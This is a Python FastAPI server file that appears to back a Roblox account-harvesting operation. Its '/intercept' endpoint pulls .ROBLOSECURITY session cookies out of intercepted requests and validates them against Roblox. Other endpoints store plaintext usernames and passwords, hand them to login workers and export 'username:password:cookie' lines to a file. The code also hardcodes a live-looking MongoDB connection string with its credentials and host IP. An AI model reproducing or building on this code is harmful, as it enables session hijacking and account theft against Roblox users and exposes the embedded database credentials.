import aiofiles
from fastapi import FastAPI, Request, HTTPException
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
import motor.motor_asyncio
from pymongo import ReturnDocument
import logging
import requests
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

# Initialize FastAPI app
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # หรือระบุ origin ที่เฉพาะเจาะจง
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/static", StaticFiles(directory="static"), name="static")


# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# MongoDB configuration
client = motor.motor_asyncio.AsyncIOMotorClient("mongodb://clm7cqub1001qbsmn1nj4ctpv:lFTpO2CZrft9yz3bNGYduxc9@161.246.127.24:9042/?readPreference=primary&ssl=false")
db = client['autologin']

# Models
class AddUserModel(BaseModel):
    username: str
    password: str
    key: str
    idd: str

class UpdateUserModel(BaseModel):
    cookie: str
    status: str

class UpdateStatusModel(BaseModel):
    username: str
    status: str

class CookieModel(BaseModel):
    cookie: str

class LogModel(BaseModel):
    key: str

# Helper function to convert MongoDB ObjectId to string
def serialize_user(user):
    user["_id"] = str(user["_id"])
    return user

def getUer(cookie: str):
    url = 'https://www.roblox.com/my/settings/json'
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        return None

# Intercept route
@app.api_route("/intercept", methods=["GET", "POST", "PUT", "DELETE"])
async def handle_intercepted_request(request: Request):
    """
    Endpoint to receive and process intercepted requests
    """
    try:
        logger.info(f"Received {request.method} request to /intercept")

        # Log headers
        # headers = dict(request.headers)
        # logger.info("Request Headers: %s", json.dumps(headers, indent=2))

        # Log request body
        body = await request.body()
        if body:
            logger.info(f"Request Body: {body.decode('utf-8')}")

            # Extract ".ROBLOSECURITY" token if present
            if ".ROBLOSECURITY=" in body.decode("utf-8"):
                try:
                    roblosecurity = (
                        body.decode("utf-8")
                        .split(".ROBLOSECURITY=")[1]
                        .split(";")[0]
                    )

                    logger.info(f"Extracted .ROBLOSECURITY token: {roblosecurity}")

                    user_data = getUer(roblosecurity)

                    if user_data:
                        existing_user = await db.users.find_one({"username": user_data['Name']})

                        if existing_user:
                            updated_user = {
                                "cookie": roblosecurity,
                                "status": 3
                            }
                            result = await db.users.find_one_and_update(
                                {"username": user_data['Name']},
                                {"$set": updated_user},
                                return_document=ReturnDocument.AFTER  # ใช้จาก pymongo
                            )
                            print(f"Update {user_data['Name']}")
                            return {"status": "success", "user_id": str(result['_id'])}
                        else:
                            raise HTTPException(status_code=400, detail="Failed to existing_user in database")
                    else:
                        raise HTTPException(status_code=400, detail="Failed to retrieve user data")
                    
                except IndexError:
                    logger.warning(".ROBLOSECURITY token not properly formatted")

        # # Log JSON payload if available
        # if request.headers.get("Content-Type") == "application/json":
        #     payload = await request.json()
        #     logger.info("JSON Payload: %s", json.dumps(payload, indent=2))

        return {"status": "success", "message": "Request intercepted successfully"}

    except Exception as e:
        logger.error(f"Error processing intercepted request: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")
    

# status
# 0 No login
# 1 Password error
# 2 Security
# 3 Login success
# 4 Login Now
    
# Add user route
@app.post("/add")
async def update_data(data: AddUserModel):
    print(data)
    print(data.username)

    existing_user = await db.users.find_one({"username": data.username})

    print(existing_user)

    if existing_user:
        return {"status": f"error same account {data.username}"}
    else:
        user = {
            "username": data.username,
            "password": data.password,
            "cookie": "",
            "key": data.key,
            "idd": data.idd,
            "status": 0
        }
        result = await db.users.insert_one(user)
        print(result)
        return {
            "status": "success",
            "data": {
                "username": data.username,
                "password": data.password
            }
        }
    
# Get Cookie Login route
@app.get("/get")
async def get_user():
    """
    Retrieve a user by username from MongoDB
    """
    existing_user = await db.users.find_one({"status": 0})
    if existing_user:
        updated_user ={
            "status": 4
        }
        result = await db.users.find_one_and_update(
            {"username": existing_user['username']},
            {"$set": updated_user},
            return_document=ReturnDocument.AFTER  # ใช้จาก pymongo
        )
        print(result)
        if not result:
            raise HTTPException(status_code=404, detail="User not found")
        return {
            "status": "success",
            "data": {
                "username": result['username'],
                "password": result['password']
            }
        }
    else:
        return {
            "status": "error No login"
        }

# Get user route
@app.get("/user")
async def get_user():
    """
    Retrieve a user by username from MongoDB
    """
    user = await db.users.find_one({"status": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return {"status": "success", "data": serialize_user(user)}

# Update user route
@app.put("/user")
async def update_user(data: UpdateUserModel):
    """
    Update a user's data in MongoDB by username
    """
    user_data = getUer(data.cookie)

    if user_data:
        print(user_data)
        existing_user = await db.users.find_one({"username": user_data['Name']})

        if existing_user:
            updated_user = {
                "cookie": data.cookie,
                "status": data.status
            }
            result = await db.users.find_one_and_update(
                {"username": user_data['Name']},
                {"$set": updated_user},
                return_document=ReturnDocument.AFTER  # ใช้จาก pymongo
            )
            print(f"Update {user_data['Name']}")
            return {"status": "success", "user_id": str(result['_id'])}
        else:
            raise HTTPException(status_code=400, detail="Failed to existing_user in database")
    else:
        raise HTTPException(status_code=400, detail="Failed to retrieve user data")

# Delete user route
@app.delete("/user/{username}")
async def delete_user(username: str):
    """
    Delete a user by username from MongoDB
    """
    result = await db.users.delete_one({"username": username})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="User not found")

    return {"status": "success", "message": "User deleted successfully"}



# Update user route
@app.put("/status")
async def update_user(data: UpdateStatusModel):
    print(data)
    existing_user = await db.users.find_one({"username": data.username})

    if existing_user:
        updated_user = {
            "status": data.status
        }
        result = await db.users.find_one_and_update(
            {"username": data.username},
            {"$set": updated_user},
            return_document=ReturnDocument.AFTER  # ใช้จาก pymongo
        )
        print(f"Update {data.username}")
        return {"status": "success", "user_id": str(result['_id'])}
    else:
        raise HTTPException(status_code=400, detail="Failed to existing_user in database")
    
async def convert_user(doc):
    return {
        "username": doc.get("username"),
        "password": doc.get("password"),
        "cookie": doc.get("cookie"),
    }

@app.get("/save")
async def save():
    users = []
    async for doc in db.users.find({'status': 3}):
        users.append(await convert_user(doc))

    async with aiofiles.open('cookie.txt', 'w') as f:
        for user in users:
            line = f'{user["username"]}:{user["password"]}:{user["cookie"]}\n'
            await f.write(line)

    # Return sanitized response (e.g., without passwords/cookies) or success message
    return {"message": f"{len(users)} users saved successfully"}

# Function to group users by "idd"
def group_by_id(users):
    grouped_data = {}
    for user in users:
        user = serialize_user(user)  # Convert ObjectId to string for each user
        idd = user.get("idd")
        if idd not in grouped_data:
            grouped_data[idd] = []
        grouped_data[idd].append(user)
    return grouped_data

@app.post("/key")
async def get_user(data: LogModel):
    # Fetch users from the database based on the provided key and status
    cursor = db.users.find({"key": data.key, "status": 3})
    
    # Convert cursor to a list of users (adjust length as needed)
    users = await cursor.to_list(length=10)

    if not users:
        raise HTTPException(status_code=404, detail="No users found")
    
    # Group users by the "idd" field
    grouped_users = group_by_id(users)
    
    # Return the grouped users as a response
    return {"status": "success", "data": grouped_users}


@app.get("/", response_class=HTMLResponse)
async def web():
    with open("static/index.html", "r") as f:
        html_content = f.read()
    return HTMLResponse(content=html_content)